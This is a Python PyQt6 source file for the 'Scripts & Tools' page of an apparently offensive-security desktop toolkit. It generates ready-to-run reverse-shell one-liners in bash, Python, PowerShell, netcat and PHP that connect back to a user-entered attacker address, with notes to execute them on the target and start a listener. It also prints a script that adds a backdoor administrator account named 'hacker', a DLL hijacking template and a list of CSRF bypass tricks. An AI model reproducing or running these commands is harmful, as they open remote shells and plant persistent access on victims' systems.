# app/pages/scripts_page_refactored.py
from PyQt6.QtWidgets import (QWidget, QPushButton, QLabel, QLineEdit, QTextEdit, 
                            QVBoxLayout, QHBoxLayout, QFrame, QTabWidget)
from PyQt6.QtCore import pyqtSignal
from PyQt6.QtGui import QShortcut, QKeySequence

class ScriptsPage(QWidget):
    navigate_signal = pyqtSignal(str)

    def __init__(self, parent=None):
        super().__init__(parent)
        self.main_window = parent
        self.setObjectName("ScriptsPage")

        self.main_layout = QVBoxLayout(self)
        self.main_layout.setContentsMargins(20, 20, 20, 20)
        self.main_layout.setSpacing(15)

        self.create_header()
        self.create_content_area()
        self.setup_shortcuts()
        self.apply_theme()

    def create_header(self):
        header_frame = QFrame()
        header_frame.setFixedHeight(60)
        header_layout = QHBoxLayout(header_frame)
        
        self.back_button = QPushButton("← Back to Home")
        self.back_button.clicked.connect(lambda: self.navigate_signal.emit("home"))
        self.back_button.setFixedWidth(150)
        
        title = QLabel("Scripts & Tools")
        title.setObjectName("TitleLabel")
        
        header_layout.addWidget(self.back_button)
        header_layout.addWidget(title, 1)
        header_layout.addStretch()
        
        self.main_layout.addWidget(header_frame)

    def create_content_area(self):
        self.tab_widget = QTabWidget()
        
        # Reverse Shells Tab
        shells_tab = self.create_shells_tab()
        self.tab_widget.addTab(shells_tab, "Reverse Shells")
        
        # Code Templates Tab
        templates_tab = self.create_templates_tab()
        self.tab_widget.addTab(templates_tab, "Code Templates")
        
        self.main_layout.addWidget(self.tab_widget)

    def create_shells_tab(self):
        tab = QWidget()
        layout = QHBoxLayout(tab)
        
        # Left panel - controls
        left_panel = QFrame()
        left_panel.setFixedWidth(200)
        left_layout = QVBoxLayout(left_panel)
        
        self.lhost_input = QLineEdit()
        self.lhost_input.setPlaceholderText("Your IP address")
        left_layout.addWidget(QLabel("LHOST:"))
        left_layout.addWidget(self.lhost_input)
        
        self.lport_input = QLineEdit()
        self.lport_input.setText("4444")
        self.lport_input.setPlaceholderText("4444")
        left_layout.addWidget(QLabel("LPORT:"))
        left_layout.addWidget(self.lport_input)
        
        left_layout.addWidget(QLabel("Shell Types:"))
        
        buttons = [
            ("Bash", self.generate_bash_shell),
            ("Python", self.generate_python_shell),
            ("PowerShell", self.generate_powershell),
            ("Netcat", self.generate_netcat_shell),
            ("PHP", self.generate_php_shell)
        ]
        
        for text, method in buttons:
            btn = QPushButton(text)
            btn.clicked.connect(method)
            btn.setMinimumHeight(35)
            left_layout.addWidget(btn)
        
        left_layout.addStretch()
        
        # Right panel - output
        right_panel = QFrame()
        right_layout = QVBoxLayout(right_panel)
        
        self.shell_output = QTextEdit()
        self.shell_output.setReadOnly(True)
        self.shell_output.setPlaceholderText("Generated reverse shells will appear here...")
        right_layout.addWidget(self.shell_output)
        
        layout.addWidget(left_panel)
        layout.addWidget(right_panel)
        
        return tab

    def create_templates_tab(self):
        tab = QWidget()
        layout = QHBoxLayout(tab)
        
        # Left panel - template types
        left_panel = QFrame()
        left_panel.setFixedWidth(200)
        left_layout = QVBoxLayout(left_panel)
        
        left_layout.addWidget(QLabel("Code Templates:"))
        
        buttons = [
            ("User Creation", self.show_user_creation_script),
            ("DLL Hijacking", self.show_dll_hijacking_code),
            ("Encoding Tools", self.show_encoding_tools),
            ("CSRF Tools", self.show_csrf_tools)
        ]
        
        for text, method in buttons:
            btn = QPushButton(text)
            btn.clicked.connect(method)
            btn.setMinimumHeight(35)
            left_layout.addWidget(btn)
        
        left_layout.addStretch()
        
        # Right panel - template output
        right_panel = QFrame()
        right_layout = QVBoxLayout(right_panel)
        
        self.template_output = QTextEdit()
        self.template_output.setReadOnly(True)
        self.template_output.setPlaceholderText("Code templates will appear here...")
        right_layout.addWidget(self.template_output)
        
        layout.addWidget(left_panel)
        layout.addWidget(right_panel)
        
        return tab

    def apply_theme(self):
        self.setStyleSheet("""
            QFrame {
                background-color: rgba(0, 0, 0, 100);
                border-radius: 10px;
                border: 1px solid rgba(100, 200, 255, 50);
            }
            QPushButton {
                background-color: rgba(30, 40, 50, 150);
                border: 2px solid rgba(100, 200, 255, 100);
                border-radius: 8px;
                color: #DCDCDC;
                font-weight: bold;
                padding: 8px;
            }
            QPushButton:hover {
                background-color: rgba(50, 70, 90, 200);
                border: 2px solid #64C8FF;
            }
            QLineEdit {
                background-color: rgba(20, 30, 40, 150);
                border: 2px solid rgba(100, 200, 255, 100);
                border-radius: 5px;
                color: #DCDCDC;
                padding: 5px;
            }
            QLabel {
                color: #64C8FF;
                font-weight: bold;
            }
            QTabWidget::pane {
                border: 1px solid rgba(100, 200, 255, 50);
                background-color: rgba(0, 0, 0, 50);
            }
            QTabBar::tab {
                background-color: rgba(30, 40, 50, 150);
                color: #DCDCDC;
                padding: 8px 16px;
                margin-right: 2px;
            }
            QTabBar::tab:selected {
                background-color: rgba(50, 70, 90, 200);
                color: #64C8FF;
            }
        """)

    def generate_bash_shell(self):
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip() or "4444"
        if not lhost:
            self.shell_output.setHtml("<p style='color: #FF4500;'>[ERROR] Please enter LHOST</p>")
            return
        bash_shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        self.shell_output.setHtml(f"""
        <div style='color: #64C8FF; font-size: 16pt; font-weight: bold;'>Bash Reverse Shell</div>
        <div style='color: #00FF41; font-size: 14pt; font-family: monospace; background: #1a1a1a; padding: 10px; margin: 10px 0;'>
        {bash_shell}
        </div>
        <div style='color: #DCDCDC; font-size: 12pt;'>
        <b>Usage:</b> Execute on target system<br>
        <b>Listener:</b> nc -lvnp {lport}
        </div>
        """)

    def generate_python_shell(self):
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip() or "4444"
        if not lhost:
            self.shell_output.setHtml("<p style='color: #FF4500;'>[ERROR] Please enter LHOST</p>")
            return
        python_shell = f"""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);"""
        self.shell_output.setHtml(f"""
        <div style='color: #64C8FF; font-size: 16pt; font-weight: bold;'>Python Reverse Shell</div>
        <div style='color: #00FF41; font-size: 12pt; font-family: monospace; background: #1a1a1a; padding: 10px; margin: 10px 0; word-wrap: break-word;'>
        {python_shell}
        </div>
        <div style='color: #DCDCDC; font-size: 12pt;'>
        <b>Usage:</b> python -c "exec above code"<br>
        <b>Listener:</b> nc -lvnp {lport}
        </div>
        """)

    def generate_powershell(self):
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip() or "4444"
        if not lhost:
            self.shell_output.setHtml("<p style='color: #FF4500;'>[ERROR] Please enter LHOST</p>")
            return
        ps_shell = f"""$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
        self.shell_output.setHtml(f"""
        <div style='color: #64C8FF; font-size: 16pt; font-weight: bold;'>PowerShell Reverse Shell</div>
        <div style='color: #00FF41; font-size: 11pt; font-family: monospace; background: #1a1a1a; padding: 10px; margin: 10px 0; word-wrap: break-word;'>
        {ps_shell}
        </div>
        <div style='color: #DCDCDC; font-size: 12pt;'>
        <b>Usage:</b> powershell -c "exec above code"<br>
        <b>Listener:</b> nc -lvnp {lport}
        </div>
        """)

    def generate_netcat_shell(self):
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip() or "4444"
        if not lhost:
            self.shell_output.setHtml("<p style='color: #FF4500;'>[ERROR] Please enter LHOST</p>")
            return
        nc_shell = f"nc -e /bin/sh {lhost} {lport}"
        nc_shell_alt = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
        self.shell_output.setHtml(f"""
        <div style='color: #64C8FF; font-size: 16pt; font-weight: bold;'>Netcat Reverse Shell</div>
        <div style='color: #00FF41; font-size: 14pt; font-family: monospace; background: #1a1a1a; padding: 10px; margin: 10px 0;'>
        {nc_shell}
        </div>
        <div style='color: #FFFF00; font-size: 12pt;'>Alternative (if -e not available):</div>
        <div style='color: #00FF41; font-size: 12pt; font-family: monospace; background: #1a1a1a; padding: 10px; margin: 10px 0; word-wrap: break-word;'>
        {nc_shell_alt}
        </div>
        <div style='color: #DCDCDC; font-size: 12pt;'>
        <b>Listener:</b> nc -lvnp {lport}
        </div>
        """)

    def generate_php_shell(self):
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip() or "4444"
        if not lhost:
            self.shell_output.setHtml("<p style='color: #FF4500;'>[ERROR] Please enter LHOST</p>")
            return
        php_shell = f"""php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'"""
        self.shell_output.setHtml(f"""
        <div style='color: #64C8FF; font-size: 16pt; font-weight: bold;'>PHP Reverse Shell</div>
        <div style='color: #00FF41; font-size: 14pt; font-family: monospace; background: #1a1a1a; padding: 10px; margin: 10px 0; word-wrap: break-word;'>
        {php_shell}
        </div>
        <div style='color: #DCDCDC; font-size: 12pt;'>
        <b>Usage:</b> Execute on target with PHP installed<br>
        <b>Listener:</b> nc -lvnp {lport}
        </div>
        """)

    def show_user_creation_script(self):
        script = """net user hacker password123 /add
net localgroup administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add"""
        self.template_output.setHtml(f"""
        <div style='color: #64C8FF; font-size: 18pt; font-weight: bold;'>Windows User Creation Script</div>
        <div style='color: #00FF41; font-size: 14pt; font-family: monospace; background: #1a1a1a; padding: 15px; margin: 15px 0;'>
        {script}
        </div>
        <div style='color: #DCDCDC; font-size: 14pt;'>
        <b>Description:</b> Creates a new user 'hacker' with password 'password123' and adds to administrators group.
        <br><br><b>Usage:</b> Execute in elevated command prompt
        </div>
        """)

    def show_dll_hijacking_code(self):
        dll_code = """#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Your payload here
        system("calc.exe");
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}"""
        self.template_output.setHtml(f"""
        <div style='color: #64C8FF; font-size: 18pt; font-weight: bold;'>DLL Hijacking Template</div>
        <div style='color: #00FF41; font-size: 12pt; font-family: monospace; background: #1a1a1a; padding: 15px; margin: 15px 0;'>
        {dll_code}
        </div>
        <div style='color: #DCDCDC; font-size: 14pt;'>
        <b>Compilation:</b> gcc -shared -o malicious.dll dll_code.c
        <br><br><b>Usage:</b> Place in application directory with vulnerable DLL name
        </div>
        """)

    def show_encoding_tools(self):
        self.template_output.setHtml("""
        <div style='color: #64C8FF; font-size: 18pt; font-weight: bold;'>Encoding Tools</div>
        <div style='color: #DCDCDC; font-size: 14pt;'>
        <b>JavaScript Encoding:</b><br>
        • encodeURIComponent() - URL encoding<br>
        • btoa() - Base64 encoding<br>
        • String.fromCharCode() - Character code conversion<br><br>
        
        <b>URL Encoding:</b><br>
        • %20 = space<br>
        • %3C = &lt;<br>
        • %3E = &gt;<br>
        • %22 = "<br>
        • %27 = '
        </div>
        """)

    def show_csrf_tools(self):
        self.template_output.setHtml("""
        <div style='color: #64C8FF; font-size: 18pt; font-weight: bold;'>CSRF Tools</div>
        <div style='color: #DCDCDC; font-size: 14pt;'>
        <b>CSRF Token Extraction:</b><br>
        • Look for hidden input fields with names like 'csrf_token', '_token', 'authenticity_token'<br>
        • Check meta tags in HTML head<br>
        • Examine HTTP headers for CSRF tokens<br><br>
        
        <b>Bypass Techniques:</b><br>
        • Remove CSRF token entirely<br>
        • Use empty token value<br>
        • Use token from different session<br>
        • Change request method (POST to GET)
        </div>
        """)

    def setup_shortcuts(self):
        self.back_shortcut = QShortcut(QKeySequence("Escape"), self)
        self.back_shortcut.activated.connect(lambda: self.navigate_signal.emit("home"))